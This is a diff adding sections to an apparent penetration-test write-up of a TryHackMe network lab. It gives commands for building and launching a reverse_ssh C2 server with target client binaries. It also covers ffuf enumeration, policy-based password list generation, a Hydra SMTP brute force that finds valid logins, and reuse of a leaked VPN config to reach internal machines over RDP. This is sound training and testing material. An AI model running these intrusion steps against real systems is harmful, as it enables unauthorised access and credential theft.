@@ -68,7 +68,38 @@ In this environment, not only was this used to create stable reverse shells on t
 
 In this fashion, reverse_ssh served as a sort of micro C2 framework.
 
+To set up reverse_ssh from the Try Hack Me attack box, the following commands were run:
+
+1. A private key was generated with `ssh-keygen -t ed25519 -P "" -f "/root/.ssh/id_ed25519" > /dev/null`
+2. The local version of Go was updated with `wget -q https://go.dev/dl/go1.18.linux-amd64.tar.gz && rm -rf /usr/local/go && tar -C /usr/local -xzf go1.18.linux-amd64.tar.gz && rm go1.18.linux-amd64.tar.gz`
+3. When later in the lab a VPN connection beyond the perimeter was established, the server was setup with:
+
+  ```
+  git clone https://github.com/NHAS/reverse_ssh
+  cd reverse_ssh
+  git checkout unstable
+  RSSH_HOMESERVER=[VPN_LOCAL_IP]:443 make
+  cd bin/
+  cp ~/.ssh/id_ed25519.pub authorized_keys
+  cp client* ~/
+  ./server --external_address [VPN_LOCAL_IP]:443 :443 &
+  ```
+  
+With the above, this sets up the server to listen on the VPN's local IP, port 443 (which is less likely to be blocked by firewalls, though that wasn't universally the case here). Additionally, the client binaries (a windows `client.exe` and a linux `client`) were copied to the home directory of the current user, ready to be uploaded to targets.
+
 ## Stage 1: OSINT of the external interfaces, and getting a foothold
+
+On top of the access to the network, a `password_base_list.txt` and `password_policy.txt` were provided. The policy stated:
+
+```text
+The password policy for TheReserve is the following:
+
+* At least 8 characters long
+* At least 1 number
+* At least 1 special character
+```
+
+While the base list was a short set of strings like TheReserve, Reserve, Password etc. Additionally, the client provided guidance that only the following special characters are permitted: `!@#$%^`.
 
 ### Initial scanning & fingerprinting
 
@@ -86,6 +117,33 @@ This identified that the WEB and VPN machines had both ports 22 and 80 open, wit
 ### WebMail overview
 
 The web interface on this box showed the IIS default page. However, the nmap -A had revealed this machine referred to itself as `mail.thereserve.loc`; by setting that as the hostname, a 404 not found was reported instead once navigating to port 80. Doing a ffuf scan with `ffuf -u http://10.200.116.11/FUZZ -H "Host: mail.thereserve.loc" -w dirwordlist.txt -x .php` where dirwordlist is basically [directory-list-2.3-medium.txt from SecLists](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/directory-list-2.3-medium.txt) revealed some subdirectories, but most importantly Index.php which when browsed to found an instance of [RoundCube WebMail](https://roundcube.net/) running. This was used to communicate further with The Reserve's security team later in the exercise.
+
+### VPN overview
+
+The landing page for the website asks for a username and password. As the consultant had neither, they performed a ffuf scan with  `ffuf -u http://10.200.116.12/FUZZ -w dirwordlist.txt`. This revealed `/vpn` and `/vpns` folders. Under the former was a file listing, containing the single file `corpUsername.ovpn` which when downloaded, seemed largely valid except for some invalid IP addresses. No further enumeration was performed on this server.
+
+### WEB overview
+
+The website on .13 would redirect to `/October/Index.php`, revealing a customised demo instance of the [October CMS](https://octobercms.com/). The version installed appeared to be 1.6, and there were no known exploits (at least unauthenticated) for this version that the consultant could find. The content of the site was largely innocuous, accept a 'meet the team' page which included numerous named employees from The Reserve. These employees were presented with photos, and the photos were named in the format 'firstname.lastname'. Assuming this might be their genuine usernames, these image names were copied into a wordlist.
+
+### Combining the pieces to gain a foothold.
+
+With a set of usernames and an approach to generate passwords, step 1 was trying to find some valid credentials. To create the word list, the tool [Mentalist](https://github.com/sc0tfree/mentalist) was used: this is an application that allows you to construct a formula for generating passwords, and then will create a wordlist from your options. The password base list was added, then an 'Append' rule adding the numbers 0-9, then finally another append rule with the valid special characters. After clicking process and saving the wordlist, the final password set was only 720 lines long.
+
+The only web interface that would be easy to brute force was the VPN portal, but this resulted in no hits. However, the tool used for brute forcing [THC-Hydra](https://github.com/vanhauser-thc/thc-hydra) is capable of attacking a number of protocols, including SMTP which was available on the WebMail server: `hydra -L usernames.txt -P passwords.txt smtp://10.200.116.11`. This fairly quickly resulted in two hits:
+
+```
+[25][smtp] host: 10.200.116.11   login: laura.wood@corp.thereserve.loc   password: [REDACTED]
+[25][smtp] host: 10.200.116.11   login: mohammad.ahmed@corp.thereserve.loc   password: [REDACTED]
+```
+
+These could be used to log in as these users in WebMail, but they had no emails or contacts to further exploit.
+
+Next, the corpUsername.ovpn file was downloaded from the VPN server. Opening this file, the one line that needs to be changed is `remote 10.200.X.X 1194`, which was updated to read `remote 10.200.116.12 1194`. When run with `openvpn corpUsername.ovpn &` a connection was made, informing the consultant that a link had been made to machines .21 and .22 inside the perimeter. To access these machines more easily, routing rules were added with `ip route add 10.200.116.21 dev tun0` and `ip route add 10.200.116.22 dev tun0`.
+
+These new machines did not respond to pings, but a quick scan with `nmap -Pn 10.200.116.21-22` revealed they had a very limited number of windows ports available, including `3389` for the remote desktop protocol.
+
+Using Remmina, the consultant connected to the first machine, passing `mohammad.ahmed@corp.thereserve.loc` and that employee's password as the credentials. This, after a short pause, opened up a remote desktop session on the WRK1 system, proving a compromise beyond the perimeter.
 
 ## Stage 2: Compromising the CORP Domain
 
